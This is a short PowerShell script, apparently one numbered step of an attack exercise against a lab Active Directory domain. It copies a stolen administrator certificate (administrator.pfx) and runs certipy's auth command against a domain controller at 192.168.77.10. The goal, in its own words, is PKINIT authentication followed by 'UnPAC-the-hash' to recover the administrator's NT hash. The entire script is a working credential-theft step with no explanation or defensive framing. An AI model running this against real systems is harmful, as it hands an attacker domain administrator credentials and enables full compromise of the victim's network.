# T050 auth + T053 UnPAC-the-hash: certipy auth with administrator.pfx
$ErrorActionPreference = "Continue"
$certpy = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\certipy.exe"
Set-Location C:\Tools\cadre-attack
$pfx = "C:\Users\analyst_t1.CHILD\administrator.pfx"
if (Test-Path $pfx) {
  Copy-Item $pfx C:\Tools\cadre-attack\administrator.pfx -Force
  Write-Output "=== certipy auth (PKINIT -> UnPAC NT hash) ==="
  & $certpy auth -pfx C:\Tools\cadre-attack\administrator.pfx -dc-ip 192.168.77.10 -domain cadre.local 2>&1 | Select-Object -Last 15
  Write-Output "auth_rc=$LASTEXITCODE"
} else {
  Write-Output "NO_PFX"
}
Write-Output "=== AUTH_DONE ==="
